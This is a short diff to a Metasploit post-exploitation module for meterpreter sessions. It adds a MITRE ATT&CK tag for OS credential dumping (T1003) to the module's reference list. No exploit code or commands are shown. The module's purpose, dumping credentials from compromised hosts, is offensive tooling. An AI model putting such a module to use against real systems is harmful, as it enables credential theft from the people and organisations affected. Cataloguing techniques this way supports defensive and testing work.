@@ -28,7 +28,8 @@ class MetasploitModule < Msf::Post
         'SessionTypes' => [ 'meterpreter' ],
         'References' => [
           [ 'URL', 'http://support.microsoft.com/kb/315231' ],
-          [ 'URL', 'http://core.yehg.net/lab/#tools.exploits' ]
+          [ 'URL', 'http://core.yehg.net/lab/#tools.exploits' ],
+          [ 'ATT&CK', Mitre::Attack::Technique::T1003_OS_CREDENTIAL_DUMPING ]
         ],
         'Notes' => {
           'Stability' => [CRASH_SAFE],
